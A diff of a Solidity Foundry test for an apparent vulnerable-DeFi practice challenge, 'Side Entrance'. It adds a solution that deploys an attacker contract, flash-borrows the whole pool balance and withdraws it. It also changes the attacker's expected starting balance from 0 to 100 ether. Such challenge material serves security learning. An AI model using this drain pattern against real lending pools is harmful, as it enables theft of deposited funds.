@@ -7,6 +7,7 @@ import {console} from "../../utils/Console.sol";
 import {Vm} from "forge-std/Vm.sol";
 
 import {SideEntranceLenderPool} from "../../../Contracts/side-entrance/SideEntranceLenderPool.sol";
+import {SideEntranceAttacker} from "../../../Contracts/side-entrance/SideEntranceAttacker.sol";
 
 contract SideEntrance is DSTest {
     Vm internal immutable vm = Vm(HEVM_ADDRESS);
@@ -32,13 +33,25 @@ contract SideEntrance is DSTest {
         assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);
 
         attackerInitialEthBalance = address(attacker).balance;
-        assertEq(attackerInitialEthBalance, 0);
+        assertEq(attackerInitialEthBalance, 100e18);
 
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
     function testExploit() public {
         /** EXPLOIT START **/
+
+        vm.startPrank(attacker);
+
+        SideEntranceAttacker sideEntranceAttacker = new SideEntranceAttacker(
+            address(sideEntranceLenderPool)
+        );
+
+        sideEntranceAttacker.borrow(ETHER_IN_POOL);
+
+        sideEntranceAttacker.withdraw();
+
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         testAfter();
